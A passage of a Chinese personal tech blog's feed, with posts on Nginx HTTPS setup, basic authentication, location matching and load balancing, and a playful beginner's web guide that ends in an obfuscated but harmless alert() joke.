里面，服务器将面临多个客户端的请求，如果使用自签发证书，会出现证书可能会被伪造。可能会有其他的客户端使用伪造的证书进行HTTPS通信。</p><p>常见的应用在于使用 <strong>SSLstrip</strong> 进行证书伪造攻击，以实现把HTTPS流量降级到HTTP。</p><p>为了<strong>避免</strong>这样的情况出现，这里就出现了 CA机构（Certificate Authority）用于进行一个可信的第三方证书保管。证书由可信第三方提供，不是直接从服务器获得，所以保护了证书被伪造的可能。</p><h3 id="证书配置"><a href="#证书配置" class="headerlink" title="证书配置"></a>证书配置</h3><p>直接在云服务商的website上面申请域名证书，这里申请的是针对 <a href="">mine.diglp.xyz</a> 的单域名证书。可以免费申请。不过 CA 机构是 <strong>TrustAsia</strong> 据说这个真的不值得Trust。。。这就另说了。</p><p>这里了解一下文件分布：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">|-- Apache</span><br><span class="line">|   |-- 1_root_bundle.crt</span><br><span class="line">|   |-- 2_mine.diglp.xyz.crt</span><br><span class="line">|   `-- 3_mine.diglp.xyz.key</span><br><span class="line">|-- IIS</span><br><span class="line">|   `-- mine.diglp.xyz.pfx</span><br><span class="line">|-- Nginx</span><br><span class="line">|   |-- 1_mine.diglp.xyz_bundle.crt</span><br><span class="line">|   `-- 2_mine.diglp.xyz.key</span><br><span class="line">`-- Tomcat</span><br><span class="line">    `-- mine.diglp.xyz.jks</span><br></pre></td></tr></table></figure><p>tree 一下目录，可见已经根据不同的Server给分成了不同的类型。内容都是一样，进行了一定程度的合并和拆分而已</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssl_certificate</span> <span class="string">"/xxx/1_mine.diglp.xyz_bundle.crt"</span>;                    </span><br><span class="line"><span class="attribute">ssl_certificate_key</span> <span class="string">"/xxx/2_mine.diglp.xyz.key"</span>;           </span><br><span class="line"><span class="attribute">ssl_session_cache</span> shared:SSL:<span class="number">1m</span>;                                             </span><br><span class="line"><span class="attribute">ssl_session_timeout</span>  <span class="number">10m</span>;                                                    </span><br><span class="line"><span class="attribute">ssl_ciphers</span> HIGH:!aNULL:!MD5;                                                </span><br><span class="line"><span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;</span><br></pre></td></tr></table></figure><p>这样就很轻松的完成了Https的配置。</p><h2 id="全站使用-HTTPS-的实现"><a href="#全站使用-HTTPS-的实现" class="headerlink" title="全站使用 HTTPS 的实现"></a>全站使用 HTTPS 的实现</h2><p>这里很巧妙的使用了重定向，实现了全站的HTTPS。通过对HTTP流量进行重定向实现</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line"><span class="attribute">listen</span> <span class="number">80</span> default_server;</span><br><span class="line">    <span class="comment">#listen [::]:80;</span></span><br><span class="line">    <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$host</span>:9943<span class="variable">$request_uri</span>;</span><br><span class="line">    <span class="comment">#rewrite ^(.*)$  https://$host$1 permanent;</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这里对所有的请求，直接重定向到HTTPS。很是巧妙</p><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>很多事，很多事，面对审判吧。</p><p>用的就记录下来</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前面的话&quot;&gt;&lt;a href=&quot;#前面的话&quot; class=&quot;headerlink&quot; title=&quot;前面的话&quot;&gt;&lt;/a&gt;前面的话&lt;/h2&gt;&lt;p&gt;需求分析，由于 搭好了日志平台，本想着把Blog迁移到主机上，最后想想，算了&lt;/p&gt;
&lt;p&gt;这里的博客的域名，本来是通过 在
      
    
    </summary>
    
      <category term="OP之路" scheme="https://blog.diglp.xyz/categories/OP%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Nginx" scheme="https://blog.diglp.xyz/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>Nginx 折腾笔记 （路由配置以及认证）</title>
    <link href="https://blog.diglp.xyz/2019/02/07/OP_Nginx%20%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0%20%EF%BC%88%E8%B7%AF%E7%94%B1%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E8%AE%A4%E8%AF%81%EF%BC%89/"/>
    <id>https://blog.diglp.xyz/2019/02/07/OP_Nginx 折腾笔记 （路由配置以及认证）/</id>
    <published>2019-02-06T16:00:00.000Z</published>
    <updated>2019-03-04T11:57:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前面的话"><a href="#前面的话" class="headerlink" title="前面的话"></a>前面的话</h2><blockquote><p>2008年，第一款安卓手机诞生，HTC G1。智能手机的十年，像是人类的一个世纪</p><p>在十年前的时候，互联网哪里有普及呢？</p><p>十年之后，世界又将怎样？</p><p>每种技能的经济价值是很快会下降的</p></blockquote><hr><p>又是拖延症爆炸的时间，这篇博文开了都自己墨迹了这么久，竟然几天之后才开始继续写，没救了。</p><p>这篇主要就是写，Nignx 的路由匹配，和一些基本的认证操作。</p><h2 id="Nginx-的认证配置"><a href="#Nginx-的认证配置" class="headerlink" title="Nginx 的认证配置"></a>Nginx 的认证配置</h2><p>这里使用 Nginx 的基础的身份认证功能，来实现对页面访问的授权访问。采用 <code>htpasswd</code> 来实现了鉴权。这个是 apache 的资自带的工具，这里也可以使用 <code>OpenSSL</code>来生成密码文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c "echo -n 'admin:' &gt;&gt; /etc/nginx/.htpasswd"</span><br><span class="line">sudo sh -c "openssl passwd -apr1 &gt;&gt; /etc/nginx/.htpasswd"</span><br></pre></td></tr></table></figure><hr><p>在 Nginx 的conf 文件中，在指定的路由路径的配置下面使用如下的配置语句：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">auth_basic</span> <span class="string">"Authorized users only"</span>;<span class="comment"># 验证提示框</span></span><br><span class="line"><span class="attribute">auth_basic_user_file</span> /home/.htpasswd;<span class="comment"># 鉴权密码文件</span></span><br></pre></td></tr></table></figure><p>在最终的 Nginx 配置里的实例配置如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span><span class="regexp"> ^~/asd/</span> &#123;</span><br><span class="line"><span class="attribute">auth_basic</span> <span class="string">"Is You?"</span>;</span><br><span class="line">    <span class="attribute">auth_basic_user_file</span> /etc/nginx/.htpasswd_k;    </span><br><span class="line">   </span><br><span class="line">    <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://localhost:5601/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样在对目的路由进行请求的时候，会被要求用户鉴权。</p><p>至此，配置完成</p><h2 id="Nginx-路由配置"><a href="#Nginx-路由配置" class="headerlink" title="Nginx 路由配置"></a>Nginx 路由配置</h2><p><code>location</code> 在 Nginx 里面是相当常见的，用于对路由路径的匹配。</p><p>通配符在这里是一个重点，</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">location [=|~|~*|^~] /uri/ &#123; … &#125;</span><br><span class="line">location modifier uri &#123;...&#125;</span><br></pre></td></tr></table></figure><h3 id="匹配类型"><a href="#匹配类型" class="headerlink" title="匹配类型"></a>匹配类型</h3><table><thead><tr><th>匹配类型</th><th>描述</th></tr></thead><tbody><tr><td>=</td><td>完全匹配 斜杠都不能多</td></tr><tr><td>~</td><td>大小写敏感 pattern 是正则表达式</td></tr><tr><td>(None)</td><td>匹配相似的部分pattern 部分相似即匹配</td></tr><tr><td>~*</td><td>大小写不敏感 pattern 是正则表达式</td></tr><tr><td>^~</td><td>和 None 类似，但是一旦匹配，即停止匹配</td></tr><tr><td>@</td><td>只能被内部访问 同 internal？</td></tr></tbody></table><h3 id="匹配示例"><a href="#匹配示例" class="headerlink" title="匹配示例"></a>匹配示例</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span><span class="regexp"> ^~</span> /us/ &#123;</span><br><span class="line"><span class="attribute">auth_basic</span> <span class="string">"Is You?"</span>;</span><br><span class="line">    <span class="attribute">auth_basic_user_file</span> /etc/nginx/.htpasswd;</span><br><span class="line">    <span class="attribute">alias</span> /usr/share/nginx/html/us/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用 <code>^~</code> 修饰符指定了是部分匹配的，但是使用了 <code>/xxx/</code> 的结构基本上也是实现了完全匹配。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line"><span class="attribute">proxy_pass</span>   http://127.0.0.1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大小写匹配的正则表达式，匹配以 <code>.php</code> 结尾的项目，转发到 fastcgi。<code>\.</code> 是转义的 <code>.</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~* .(gif|jpg|jpeg)$</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前面的话&quot;&gt;&lt;a href=&quot;#前面的话&quot; class=&quot;headerlink&quot; title=&quot;前面的话&quot;&gt;&lt;/a&gt;前面的话&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;2008年，第一款安卓手机诞生，HTC G1。智能手机的十年，像是人类的一个世纪&lt;/p&gt;
&lt;p&gt;在
      
    
    </summary>
    
      <category term="OP之路" scheme="https://blog.diglp.xyz/categories/OP%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Nginx" scheme="https://blog.diglp.xyz/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>写给小安的WEB入坑指南</title>
    <link href="https://blog.diglp.xyz/2019/01/30/web_%E5%86%99%E7%BB%99%E5%B0%8F%E5%AE%89%E7%9A%84WEB%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97/"/>
    <id>https://blog.diglp.xyz/2019/01/30/web_写给小安的WEB入坑指南/</id>
    <published>2019-01-29T16:00:00.000Z</published>
    <updated>2019-03-04T11:57:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是web"><a href="#什么是web" class="headerlink" title="什么是web"></a>什么是web</h2><blockquote><p>web（World Wide Web）即全球广域网，也称为万维网，它是一种基于超文本和HTTP的、全球性的、动态交互的、跨平台的分布式图形信息系统。</p></blockquote><p>这里引用自百科，这这里就粗浅的理解为我们的网站吧。</p><h2 id="前端和后端"><a href="#前端和后端" class="headerlink" title="前端和后端"></a>前端和后端</h2><p>WEB的结构是 <code>B/S</code>模式（Browser/Server，浏览器/服务器模式），这种模式区别于 <code>C/S</code> （Client/Server）模式。</p><p>（想想CS模式，常见的是我们的桌面软件（QQ，etc）），所以 BS 的特点就是<strong>功能在服务器的高度集中</strong>，使用浏览器就可以和所需的不同服务进行交互。</p><hr><p>前端后端，是我们在web方面听到的较多的词汇，其实际上的功能是什么呢？</p><h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><p><strong>提词：</strong></p><ul><li>HTML （How to meet lady）（页面的主体，可以理解为ppt的内容）</li><li>CSS        （决定ppt内容的样子，方的圆的）</li><li>JavaScript    （赋予了页面动态的效果）</li><li>BootStrap    （用于设计界面的一个框架）</li><li>JQuery        （用于更好的动态功能的组件）</li><li>…</li></ul><p>好，上面的名词看晕了，那么现在就来看看什么是前端。</p><p>简单切不严谨的说，用户通过浏览器直接接触到的东西就是前端。那么怎么讲呢？简单！按一下 <code>F12</code>就看见了熙熙攘攘的代码堆起来了。</p><hr><p>鼠标在元素选项卡(Element)，选中 Html 中的不同标签，发现其是在页面中是一一对应的。所以说，页面的内容和我们 HTML 中的标签是一一对应的（不严谨），这样就可以得出结论，HTML 是页面的骨架对吧，构建出了整个页面的<strong>基本内容</strong>。</p><blockquote><p>HTML 就是PPT的内容，实现了基本的页面内容</p></blockquote><hr><p>接下来，就是介绍 JavaScript 的时候了，JS 这个名号听着厉害，实际上一直在浏览器上跑着呢。这里继续 <code>F12</code> 在里面找到 <strong>控制台(Console)</strong>，在里面输入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="string">'love ann!'</span>);</span><br><span class="line">confirm(<span class="string">'Would U like be With me?'</span>);</span><br></pre></td></tr></table></figure><p>(如果看到这里，可以去跑一下晚上的神秘代码！)</p><p>所以 JS 的功能呢，就是可以赋予网页动态的灵魂（类比给 ppt 加上了动画），这样就可以实现很多炫酷的效果。这些代码在浏览器里偷偷运行着。</p><p>或者试试这个？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.map($(<span class="string">'div'</span>), <span class="function"><span class="keyword">function</span>(<span class="params">e,t,n</span>)</span>&#123;$(e).css(&#123;<span class="string">"background"</span>: <span class="string">"red"</span>&#125;);&#125;)</span><br></pre></td></tr></table></figure><p>红彤彤的，是不是一下子就过年了？？？</p><blockquote><p>JS 就是 PPT 里面的动画，实现了动态效果，比如点击消失</p></blockquote><hr><p>CSS （Cascading Style Sheets） 层叠样式表，是不是有些时候页面加载出来很奇怪？ 比如一堆内容堆在了屏幕的坐标，刷新几次就好了？ 这里就是这个CSS没有加载出来。</p><p>简单的说呢？ 这个东西是来配置一个<strong>页面元素</strong> 长什么样子的，怎么说呢？我们还是看上面的代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.map($(<span class="string">'div'</span>), <span class="function"><span class="keyword">function</span>(<span class="params">e,t,n</span>)</span>&#123;$(e).css(&#123;<span class="string">"background"</span>: <span class="string">"red"</span>&#125;);&#125;)</span><br></pre></td></tr></table></figure><p>虽然有点晕晕的，不过我们看里面的部分 <code>css({&quot;background&quot;: &quot;red&quot;})</code> 是不是瞬间熟悉了，这里其实完成的就是对元素的样式进行了调整，把背景设置成了红彤彤。</p><hr><p>好的，前端我说完了 XD</p><h2 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h2><p><strong>提词：</strong></p><ul><li><p>Web服务器 Nginx Apache</p></li><li><p>数据库 Mysql， MongoDB，Redis …</p></li><li><p>PHP，Python，Java …</p></li><li><p>ThinkPHP，Django，Spring …</p></li><li><p>这里的词就有些模式了吧？ 慢慢来</p></li></ul><p>现在我们到了，后端了。这个又怎么说？一句话，用户摸不到的地方就是后端。怎么理解呢？</p><p>看我们平时登陆一些服务的时候，这个过程一定熟悉。我们的账户就保存在 后端的 数据库之中，每每我们登陆的时候，把账号密码发送给目标服务器，服务器帮我验证，你的密码和注册的时候是不是一样的，从而判断是不是你。（不可能放在前端对吧？否则 你 F12 就看见密码了，吼吼吼）</p><hr><p>先从 WEB服务器来讲吧，这到底是个啥呢？ </p><p>我们的Html文件，在本地磁盘上，我们直接双击打开，看已经打开了一个网页了对吧？</p><p>那么 WEB服务器 的功能，<strong>就是帮你找东西</strong>。比如我要访问这个链接</p><p><a href="https://blog.diglp.xyz/2019/01/20/Nginx%20log/index.html">https://blog.diglp.xyz/2019/01/20/Nginx%20log/index.html</a></p><p>分段来看：</p><ul><li><a href="https://blog.diglp.xyz">https://blog.diglp.xyz</a>                    这里就是访问了服务器对吧</li><li>/2019/01/20/Nginx%20log/index.html      这里呢？就是在服务器里面找东西了</li></ul><p>想想昨天的 <code>pwd</code> 是不是就好理解了？</p><hr><p>数据库，这里其实听名字就知道啦，存数据的地方。我们可以使用 <code>SQL</code> （Structured Query Language）语言，对数据进行查询。</p><p>MongoDB 是一种新式数据库，基于文件的  NoSQL， 突破了结构化的限制 是  <strong>NoSQL</strong> （Not Only）</p><p>Redis 实现在内存中实现数据存储，数据更快，一般用于请求量极大的数据，保持高命中率。</p><hr><p>编程语言，和编程框架，这里放在一起啦。上面的每一种语言 都可以轻松实现一个 hello world。</p><ul><li>PHP 本身是一种编程语言，是和 python 一个层级，.py 需要 python runtime 。.php 需要 php 的 runtime。两个东西都可以很简单的使用 <code>python x.py</code> 和 <code>php x.php</code> 的运行起来</li><li>当 python 使用 flask/Django 开始 web 开发的时候了。和 PHP 的 web 框架 (ThinkPHP) 作用在一个层级了。<strong>不准确的讲</strong>每次访问，都会启动一个进程，对这个脚本内的内容进行运行， 这里的运行是在服务器端的。对我的的请求进行解析，比如 url 的路由路径， 请求方式等进行响应。</li><li>这时候仍然是在服务器端， 进行数据库的增删查改。 把操作 (得到的数据，传递到前端) <code>index.php?category=x</code></li><li>前端进行数据获取，由 js 脚本，实现静态 html 的显示刷新</li></ul><p>XD 这里我从之前的地方 Copy了，饿了！</p><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">p,a,c,k,e,d</span>)</span>&#123;e=<span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span>(c&lt;a?<span class="string">""</span>:e(<span class="built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="built_in">String</span>.fromCharCode(c+<span class="number">29</span>):c.toString(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!<span class="string">''</span>.replace(<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(c--)d[e(c)]=k[c]||e(c);k=[<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> d[e]&#125;];e=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">'\\w+'</span>&#125;;c=<span class="number">1</span>;&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\\b'</span>+e(c)+<span class="string">'\\b'</span>,<span class="string">'g'</span>),k[c]);<span class="keyword">return</span> p;&#125;(<span class="string">'7["\\6\\8\\a\\9\\2"](\'\\1\\1\\5\\4\\3\\h\\g\\i\\k\\j\\c\\b\\0\\0\\d\\f\\e\');'</span>,<span class="number">21</span>,<span class="number">21</span>,<span class="string">'u661f|u563b|x74|u505a|uff01|u6bdb|x61|window|x6c|x72|x65|uff08|x7e|u773c|uff09|u2728|u5973|u6211|u670b|u5427|u53cb'</span>.split(<span class="string">'|'</span>),<span class="number">0</span>,&#123;&#125;))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是web&quot;&gt;&lt;a href=&quot;#什么是web&quot; class=&quot;headerlink&quot; title=&quot;什么是web&quot;&gt;&lt;/a&gt;什么是web&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;web（World Wide Web）即全球广域网，也称为万维网，它是一种基于超文
      
    
    </summary>
    
      <category term="WEB" scheme="https://blog.diglp.xyz/categories/WEB/"/>
    
    
      <category term="web" scheme="https://blog.diglp.xyz/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Nginx 折腾笔记（LB 和 Tunnel）</title>
    <link href="https://blog.diglp.xyz/2019/01/20/OP_Nginx%20%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0%EF%BC%88LB%20%E5%92%8C%20Tunnel%EF%BC%89/"/>
    <id>https://blog.diglp.xyz/2019/01/20/OP_Nginx 折腾笔记（LB 和 Tunnel）/</id>
    <published>2019-01-19T16:00:00.000Z</published>
    <updated>2019-03-04T11:57:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前面的话"><a href="#前面的话" class="headerlink" title="前面的话"></a>前面的话</h2><p>突然又是折腾了一波nginx，其中一点点的配置和过程在这里记录一下。</p><p>下午又把 《社交网络》这部片看了一遍，又是一种熟悉的热血沸腾的感觉。</p><p>思考自己仿佛也是在同样的年龄，但是，为什么却是那种的遥不可及的的感觉，</p><p>也许这个就是文化吧。一定去西海岸！</p><blockquote><p> drop the The, just Facebook</p></blockquote><hr><ol><li><p>这世道，绅士做不了。海盗才是王。</p></li><li><p>签任何协议之前至少看3遍以上。 </p></li><li>出卖你的往往是你最好的朋友</li></ol><h2 id="之前的场景"><a href="#之前的场景" class="headerlink" title="之前的场景"></a>之前的场景</h2><p>内网不通，怎么打洞，使得外网可以访问。内网打洞。</p><p>原始方案，两次端口转发，加上 VPN。这样实现协议栈倒是没有加其他的东西，都团原生的。</p><p>后面 想想，使用 <code>frp</code> 或者 <code>ngrok</code>  直接实现内网的转发，到还是一个更好的方法了。之前的只是赞成做了个理论性的尝试，没想到，ei？还真是能用。</p><hr><p>方案的两次转发，主要在于，不同网段之间的转发。</p><ol><li>由服务器 外网的网段， 转发到 VPN 的子网网段的内网主机 IP</li><li>在内网主机上，由VPN的子网网段，转发到内网网卡</li><li>并且设置内网的网卡路由走内网网关</li></ol><hr><h2 id="Nginx-Port-forwarding-and-Load-Balance"><a href="#Nginx-Port-forwarding-and-Load-Balance" class="headerlink" title="Nginx Port forwarding and Load Balance"></a>Nginx Port forwarding and Load Balance</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">stream</span> &#123;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span> <span class="number">127.0.0.1:7000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置文件很容易的实现了 <strong>80到7000端口</strong> 的转发，</p><p>下面的配置很容易实现转发的 <strong>LB</strong> 这里就会有很好的用处</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">stream</span> &#123;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span> frp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">upstream</span> frp&#123;</span><br><span class="line">        <span class="attribute">server</span> <span class="number">127.0.0.1:7000</span>;</span><br><span class="line">        <span class="attribute">server</span> <span class="number">127.0.0.1:8000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>这里一个point 是 <strong>七层均衡</strong> 还是 <strong>四层均衡</strong>。这里的层指的是在协议栈中的层级 ，OSI 的七层结构，其中的七层均衡指的就是在应用层实现的（HTTP），四层就是在传输层（tcp）。</p><p>这里的配置段是存在于 stream 的不是在 Http中。</p><hr><p>这里本来有个突然很荒谬的想法：能不能使用 server_name 用来对不同的 <strong>referer</strong> 进行都不同端口的转发。</p><p>（事实上，当然可以通过虚拟主机，在同一个端口上，通过 server_name 字段来解析到不同的端口，配置如下）</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">upstream</span> baidu&#123; </span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:8081</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="attribute">upstream</span> google &#123; </span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:8082</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123; </span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>; </span><br><span class="line">    <span class="attribute">server_name</span> www.baidu.cn baidu.cn;</span><br><span class="line">    <span class="attribute">proxy_set_header</span>   Host             <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span>   X-Real-IP        <span class="variable">$remote_addr</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span>   X-Forwarded-For  <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    <span class="attribute">location</span> / &#123; </span><br><span class="line">        <span class="attribute">proxy_pass</span> http://baidu; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123; </span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>; </span><br><span class="line">    <span class="attribute">server_name</span> www.google.cn google.cn;</span><br><span class="line">    <span class="attribute">proxy_set_header</span>   Host             <span class="variable">$host</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span>   X-Real-IP        <span class="variable">$remote_addr</span>;</span><br><span class="line">    <span class="attribute">proxy_set_header</span>   X-Forwarded-For  <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://google; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就可以，实现在同一端口的来自已不同站点的请求，分配到各自不同的 server。</p><hr><p>当时就想，能不能 我的 Frp 连接也可以实现这样的域名绑定呢？当时有点懵，显然回答是不行的。</p><p>回到<strong>Domain Name</strong> 的解析原理，最终是在 Dns server 解析成为真实的 IP 。在进行 HTTP 的forward 的时候，其源站实际上是包含在 HTTP 的请求包里面的，所以，Nginx 可以对其不同的源站解析的不同的端口。</p><p>那么这里回到前面 的情况，如果是使用了nginx 来对一个 tcp 连接进行分发。可能实现吗？</p><p>不可能，因为，根本无法获得源站的地址呀。这里就是问题所在了。</p><h2 id="关于-Nginx-LB-的配置"><a href="#关于-Nginx-LB-的配置" class="headerlink" title="关于 Nginx LB 的配置"></a>关于 Nginx LB 的配置</h2><p>这里就顺便，巩固一下 LB 的相关配置：</p><h3 id="Nginx-的-LB-类型"><a href="#Nginx-的-LB-类型" class="headerlink" title="Nginx 的 LB 类型"></a>Nginx 的 LB 类型</h3><p><strong>nginx 的 upstream目前支持 4 种方式的分配</strong> 引用自（<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbWljcm90aWdlci9wLzc2MjM4NTguaHRtbO+8iQ==" title="https://www.cnblogs.com/microtiger/p/7623858.html）">https://www.cnblogs.com/microtiger/p/7623858.html）<i class="fa fa-external-link"></i></span></p><ol><li>轮询（默认） </li></ol><p>　　每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，<strong>能自动剔除</strong>。 </p><ol><li>weight </li></ol><p>　　指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。 </p><ol><li>ip_hash </li></ol><p>　　每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。  </p><ol><li>fair（第三方） </li></ol><p>　　按后端服务器的响应时间来分配请求，响应时间短的优先分配。  <strong>这个感觉不错，后面可以试试</strong></p><ol><li>url_hash（第三方）</li></ol><hr><p>ip_hash是容易理解的，但是因为仅仅能用ip这个因子来分配后端，因此ip_hash是有缺陷的，不能在一些情况下使用：</p><p>nginx不是最前端的服务器。ip_hash要求nginx一定是最前端的服务器，否则nginx得不到正确ip，就不能根据ip作hash。譬如使用的是squid为最前端，那么nginx取ip时只能得到squid的服务器ip地址，用这个地址来作分流是肯定错乱的。</p><p>这里就最好使用 Url_hash 的方式，根据 不同的 Url 进行分流。</p><hr><p>不过这里又有了一个严重的问题 ：<strong>Session 和 